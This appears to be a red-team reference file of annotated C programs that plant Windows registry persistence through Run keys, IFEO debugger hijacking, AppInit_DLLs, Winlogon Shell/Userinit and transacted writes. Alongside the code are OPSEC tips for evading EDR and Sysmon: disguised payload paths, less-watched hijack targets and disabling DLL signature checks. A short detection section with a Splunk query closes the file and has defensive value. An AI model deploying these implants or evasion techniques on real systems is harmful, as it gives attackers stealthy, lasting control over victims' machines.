# Registry Persistence - Code Implementations

MITRE ATT&CK: T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
MITRE ATT&CK: T1546.012 - Event Triggered Execution: Image File Execution Options Injection

> **Authorized security testing only.** These code patterns are reference material for red team professionals operating under explicit written authorization.

## Overview

The Windows registry is a hierarchical database that the OS and applications consult at boot, logon, and during normal operation. Several well-documented registry locations cause automatic execution of programs. This file provides annotated C implementations for each major autostart location, compares their OPSEC profiles, and catalogs the detection artifacts each technique produces.

See also: [Registry Persistence (Narrative)](../../04-persistence/registry-persistence.md)

## Registry Autostart Location Hierarchy

```
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run          <-- per-user, survives reboot
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce      <-- per-user, single execution
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run          <-- machine-wide, requires admin
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce      <-- machine-wide, single exec
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx    <-- DLL-based single execution
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon  <-- Shell, Userinit values
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\
    Image File Execution Options\<target.exe>                <-- IFEO debugger redirect
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows   <-- AppInit_DLLs
```

**Privilege requirements:**
- HKCU keys: standard user
- HKLM keys: local administrator (High integrity)

## C Implementation: Generic Run Key Writer

```c
/*
 * registry_run_key.c
 * Writes a value to a specified registry autostart location.
 *
 * Compile: cl.exe /W4 /Fe:regrun.exe registry_run_key.c advapi32.lib
 *
 * DETECTION ARTIFACTS:
 *   - Sysmon Event 13 (RegistryValueSet) fires for any SetValue operation
 *   - EDR products hook NtSetValueKey in kernel; this code goes through
 *     the standard Win32 API path and WILL be intercepted
 *   - The value persists in the registry hive file on disk (NTUSER.DAT
 *     for HKCU, SOFTWARE for HKLM) and is visible to offline forensics
 *   - Autoruns (Sysinternals) displays all these locations in its GUI
 */

#include <windows.h>
#include <stdio.h>

/* OPSEC NOTE: Choosing the right key matters. See comparison table below.
 * HKCU\...\Run is the least privileged but also the most commonly
 * monitored autostart location in enterprise environments. */

#define RUN_KEY_HKCU  L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
#define RUN_KEY_HKLM  L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
#define RUNONCE_HKCU  L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"

int SetRunKey(HKEY hRoot, LPCWSTR subKey, LPCWSTR valueName, LPCWSTR payloadPath) {
    HKEY hKey = NULL;
    LONG status;

    /* RegOpenKeyExW: opens an existing key.
     * KEY_SET_VALUE is the minimum required access right.
     *
     * OPSEC: Using KEY_SET_VALUE rather than KEY_ALL_ACCESS reduces the
     * access mask logged in Security Event 4657 (if auditing is enabled).
     * Some EDR products flag KEY_ALL_ACCESS as suspicious. */
    status = RegOpenKeyExW(
        hRoot,          /* HKCU or HKLM */
        subKey,         /* Path beneath the root */
        0,              /* Reserved, must be 0 */
        KEY_SET_VALUE,  /* Minimum privilege needed */
        &hKey
    );
    if (status != ERROR_SUCCESS) {
        printf("[!] RegOpenKeyExW failed: %ld\n", status);
        return -1;
    }

    /* RegSetValueExW: sets the data for a registry value.
     *
     * DETECTION: This is the operation that triggers Sysmon Event 13.
     * The event captures:
     *   - TargetObject (full registry path including value name)
     *   - Details (the payload path we are writing)
     *   - Process GUID, PID, User, Image
     *
     * OPSEC: The value DATA (payloadPath) is stored in cleartext in the
     * registry. Any analyst running "reg query" or autoruns will see it.
     * Consider using an innocuous-looking path like
     * C:\Program Files\Common Files\System\update.exe */
    DWORD dataSize = (DWORD)((wcslen(payloadPath) + 1) * sizeof(WCHAR));
    status = RegSetValueExW(
        hKey,
        valueName,      /* Value name shown in regedit, e.g. "WindowsUpdate" */
        0,              /* Reserved */
        REG_SZ,         /* String type -- REG_EXPAND_SZ if you need %envvar% */
        (const BYTE*)payloadPath,
        dataSize
    );

    RegCloseKey(hKey);

    if (status != ERROR_SUCCESS) {
        printf("[!] RegSetValueExW failed: %ld\n", status);
        return -1;
    }

    printf("[+] Value written successfully.\n");
    return 0;
}

int wmain(int argc, wchar_t* argv[]) {
    if (argc < 3) {
        printf("Usage: regrun.exe <valueName> <payloadPath>\n");
        return 1;
    }
    /* Default: write to HKCU Run key (no admin required) */
    return SetRunKey(HKEY_CURRENT_USER, RUN_KEY_HKCU, argv[1], argv[2]);
}
```

## C Implementation: Image File Execution Options (IFEO) Debugger Persistence

```c
/*
 * ifeo_debugger.c
 * Sets the "Debugger" value under IFEO to redirect execution of a target binary.
 *
 * Technique: When Windows launches <target.exe>, the kernel checks IFEO for a
 * Debugger value. If present, it launches the debugger with <target.exe> as an
 * argument. The original binary never runs -- the "debugger" gets control.
 *
 * Example: Setting Debugger for "notepad.exe" to "C:\implant.exe" means every
 * launch of notepad.exe actually runs implant.exe with "notepad.exe" as argv[1].
 *
 * MITRE ATT&CK: T1546.012
 *
 * DETECTION ARTIFACTS:
 *   - Sysmon Event 13: registry write to IFEO\<target>\Debugger
 *   - Process creation shows implant.exe with unexpected command line
 *   - Autoruns shows IFEO entries in the "Image Hijacks" tab
 *
 * Compile: cl.exe /W4 /Fe:ifeo.exe ifeo_debugger.c advapi32.lib
 */

#include <windows.h>
#include <stdio.h>

int SetIFEO(LPCWSTR targetExe, LPCWSTR debuggerPath) {
    HKEY hKey = NULL;
    WCHAR subKey[512];

    /* Build the full IFEO subkey path.
     * OPSEC: Choose a target binary that the user runs frequently but is
     * not critical to system operation. sethc.exe (Sticky Keys) is a classic
     * but heavily monitored. Consider targeting less-scrutinized binaries
     * like mspaint.exe or charmap.exe. */
    _snwprintf_s(subKey, 512, _TRUNCATE,
        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\"
        L"Image File Execution Options\\%s", targetExe);

    /* RegCreateKeyExW: creates the key if it does not exist.
     * OPSEC: Creating new subkeys under IFEO is more suspicious than
     * modifying existing ones. Some IFEO entries already exist for
     * legitimate debugging/compatibility (e.g., iexplore.exe). */
    LONG status = RegCreateKeyExW(
        HKEY_LOCAL_MACHINE,
        subKey,
        0, NULL,
        REG_OPTION_NON_VOLATILE,  /* Persists across reboot */
        KEY_SET_VALUE,
        NULL,
        &hKey,
        NULL
    );
    if (status != ERROR_SUCCESS) {
        printf("[!] RegCreateKeyExW failed: %ld (need admin?)\n", status);
        return -1;
    }

    /* The "Debugger" value is the magic key that Windows checks.
     * DETECTION: EDR products specifically monitor this value name. */
    DWORD dataSize = (DWORD)((wcslen(debuggerPath) + 1) * sizeof(WCHAR));
    status = RegSetValueExW(hKey, L"Debugger", 0, REG_SZ,
                            (const BYTE*)debuggerPath, dataSize);
    RegCloseKey(hKey);
    return (status == ERROR_SUCCESS) ? 0 : -1;
}
```

## C Implementation: AppInit_DLLs Injection

```c
/*
 * appinit_dlls.c
 * Configures AppInit_DLLs so that every user-mode process loading user32.dll
 * also loads the specified DLL.
 *
 * OPSEC WARNING: This is a VERY noisy technique.
 *   - Affects ALL processes that load user32.dll (nearly everything with a GUI)
 *   - Requires LoadAppInit_DLLs DWORD to be set to 1
 *   - On Win10+, requires the DLL to be code-signed if
 *     RequireSignedAppInit_DLLs is 1 (default on x64)
 *   - Easily spotted by autoruns and any registry monitoring
 *
 * Registry path:
 *   HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows
 *     AppInit_DLLs = <path to DLL>        (REG_SZ, space-separated)
 *     LoadAppInit_DLLs = 1                (REG_DWORD)
 *     RequireSignedAppInit_DLLs = 0       (REG_DWORD, must disable on x64)
 *
 * Compile: cl.exe /W4 /Fe:appinit.exe appinit_dlls.c advapi32.lib
 */

#include <windows.h>
#include <stdio.h>

int SetAppInitDLL(LPCWSTR dllPath) {
    HKEY hKey = NULL;
    LPCWSTR subKey = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows";

    LONG status = RegOpenKeyExW(HKEY_LOCAL_MACHINE, subKey, 0,
                                KEY_SET_VALUE, &hKey);
    if (status != ERROR_SUCCESS) return -1;

    /* Set the DLL path */
    DWORD dataSize = (DWORD)((wcslen(dllPath) + 1) * sizeof(WCHAR));
    RegSetValueExW(hKey, L"AppInit_DLLs", 0, REG_SZ,
                   (const BYTE*)dllPath, dataSize);

    /* Enable loading -- without this, AppInit_DLLs is ignored */
    DWORD enable = 1;
    RegSetValueExW(hKey, L"LoadAppInit_DLLs", 0, REG_DWORD,
                   (const BYTE*)&enable, sizeof(DWORD));

    /* Disable signature requirement (x64 systems enforce this by default)
     * DETECTION: Disabling RequireSignedAppInit_DLLs is a HIGH-fidelity
     * detection signal. Very few legitimate applications need this. */
    DWORD disableSig = 0;
    RegSetValueExW(hKey, L"RequireSignedAppInit_DLLs", 0, REG_DWORD,
                   (const BYTE*)&disableSig, sizeof(DWORD));

    RegCloseKey(hKey);
    return 0;
}
```

## C Implementation: Winlogon Shell/Userinit Modification

```c
/*
 * winlogon_persist.c
 * Appends a payload to Winlogon's Shell or Userinit value.
 * Key: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
 *   Shell    = explorer.exe  ->  explorer.exe, C:\payload.exe
 *   Userinit = userinit.exe, ->  userinit.exe, C:\payload.exe,
 *
 * OPSEC: Heavily monitored by autoruns/EDR. Always APPEND (replacing
 * explorer.exe breaks the desktop). Userinit runs as SYSTEM/session 0;
 * Shell runs as the logged-in user.
 * Compile: cl.exe /W4 /Fe:winlogon.exe winlogon_persist.c advapi32.lib
 */
#include <windows.h>
#include <stdio.h>

int ModifyWinlogonValue(LPCWSTR valueName, LPCWSTR appendPayload) {
    HKEY hKey = NULL;
    LPCWSTR subKey = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon";
    WCHAR currentValue[1024] = {0};
    DWORD currentSize = sizeof(currentValue), type = 0;

    LONG status = RegOpenKeyExW(HKEY_LOCAL_MACHINE, subKey, 0,
                                KEY_READ | KEY_SET_VALUE, &hKey);
    if (status != ERROR_SUCCESS) return -1;

    /* Read existing value -- APPEND, never replace */
    status = RegQueryValueExW(hKey, valueName, NULL, &type,
                              (LPBYTE)currentValue, &currentSize);
    if (status != ERROR_SUCCESS) { RegCloseKey(hKey); return -1; }

    WCHAR newValue[2048] = {0};
    _snwprintf_s(newValue, 2048, _TRUNCATE, L"%s, %s", currentValue, appendPayload);
    DWORD newSize = (DWORD)((wcslen(newValue) + 1) * sizeof(WCHAR));
    status = RegSetValueExW(hKey, valueName, 0, REG_SZ,
                            (const BYTE*)newValue, newSize);
    RegCloseKey(hKey);
    return (status == ERROR_SUCCESS) ? 0 : -1;
}
```

## Transacted Registry Writes (Swarmer / NTUSER.MAN Technique)

```c
/*
 * transacted_registry.c
 * Uses the Kernel Transaction Manager (KTM) to perform registry writes inside
 * a transaction. The write is not visible to real-time registry monitors until
 * the transaction is committed, and some EDR products do not correctly hook
 * transacted operations.
 *
 * This technique was observed in the Swarmer malware family (2025) which abused
 * transacted writes to NTUSER.MAN (the mandatory profile registry hive) to
 * establish persistence that survives profile rebuilds.
 *
 * API: CreateTransaction -> RegOpenKeyTransacted -> RegSetValueExW -> CommitTransaction
 * OPSEC: Sysmon pre-15.x did NOT log transacted writes in Event 13. Atomic
 *   (rolls back on crash). ETW Kernel-Registry logs if verbose (rare in SOCs).
 * Compile: cl.exe /W4 /Fe:txreg.exe transacted_registry.c advapi32.lib ktmw32.lib
 */

#include <windows.h>
#include <stdio.h>

/* ktmw32.h may not be available in older SDKs; declare manually */
typedef HANDLE (WINAPI *pCreateTransaction)(
    LPSECURITY_ATTRIBUTES, LPGUID, DWORD, DWORD, DWORD, DWORD, LPWSTR);
typedef BOOL (WINAPI *pCommitTransaction)(HANDLE);

/* RegOpenKeyTransacted is declared in winreg.h on Win10 SDK */

int TransactedRunKeyWrite(LPCWSTR valueName, LPCWSTR payloadPath) {
    HMODULE hKtm = LoadLibraryW(L"ktmw32.dll");
    if (!hKtm) return -1;

    pCreateTransaction fnCreate =
        (pCreateTransaction)GetProcAddress(hKtm, "CreateTransaction");
    pCommitTransaction fnCommit =
        (pCommitTransaction)GetProcAddress(hKtm, "CommitTransaction");

    if (!fnCreate || !fnCommit) return -1;

    /* Create KTM transaction (not commonly logged; ETW verbose only) */
    HANDLE hTxn = fnCreate(NULL, NULL, 0, 0, 0, 0, NULL);
    if (hTxn == INVALID_HANDLE_VALUE) return -1;

    HKEY hKey = NULL;
    LONG status = RegOpenKeyTransactedW(
        HKEY_CURRENT_USER,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        0,
        KEY_SET_VALUE,
        &hKey,
        hTxn,       /* Transaction handle -- this is the key difference */
        NULL
    );
    if (status != ERROR_SUCCESS) {
        CloseHandle(hTxn);
        return -1;
    }

    DWORD dataSize = (DWORD)((wcslen(payloadPath) + 1) * sizeof(WCHAR));
    RegSetValueExW(hKey, valueName, 0, REG_SZ,
                   (const BYTE*)payloadPath, dataSize);
    RegCloseKey(hKey);

    /* CommitTransaction: write becomes visible. The window between SetValue
     * and Commit is where the write is "invisible" to non-transacted readers. */
    fnCommit(hTxn);
    CloseHandle(hTxn);

    return 0;
}
```

## OPSEC Comparison Table

| Registry Location | Privilege | Monitored By Autoruns | Sysmon Event 13 | EDR Coverage | OPSEC Rating |
|---|---|---|---|---|---|
| `HKCU\...\Run` | User | Yes (prominent) | Yes | Very High | Poor |
| `HKLM\...\Run` | Admin | Yes (prominent) | Yes | Very High | Poor |
| `HKCU\...\RunOnce` | User | Yes | Yes | High | Poor |
| `IFEO\<exe>\Debugger` | Admin | Yes (Image Hijacks tab) | Yes | High | Low-Medium |
| `AppInit_DLLs` | Admin | Yes | Yes | High | Poor |
| `Winlogon\Shell` | Admin | Yes | Yes | Very High | Poor |
| `Winlogon\Userinit` | Admin | Yes | Yes | Very High | Poor |
| Transacted writes | Varies | Delayed visibility | Partial (version-dependent) | Medium | Medium |

**Key takeaway:** All standard registry persistence locations are well-known and heavily monitored. The differentiator is HOW the write is performed (direct API vs transacted, standard path vs unusual path) and the choice of value name and payload path.

## Detection Indicators

- **Sysmon Event 13** (RegistryValueSet): fires on any SetValue to these keys. Captures TargetObject (full path), Details (payload path), and the Image that performed the write.
- **Offline**: parse `NTUSER.DAT` / `SOFTWARE` hive with Registry Explorer or `reg.py`; run `autorunsc.exe -a r -h -s -nobanner`.

### Detection Query (Splunk SPL)

```
index=sysmon EventCode=13
  TargetObject IN ("*\\CurrentVersion\\Run\\*", "*\\CurrentVersion\\RunOnce\\*",
                   "*\\Image File Execution Options\\*\\Debugger",
                   "*\\Winlogon\\Shell", "*\\Winlogon\\Userinit",
                   "*\\Windows\\AppInit_DLLs")
| stats count by Image, TargetObject, Details, User
```

## Cross-References

- [Registry Persistence (Narrative)](../../04-persistence/registry-persistence.md)
- [Scheduled Task Creation (Code)](scheduled-task-creation.md) -- alternative persistence
- [Service Persistence (Code)](service-persistence.md) -- higher-privilege persistence
- [Detection Engineering](../../12-detection-engineering/)
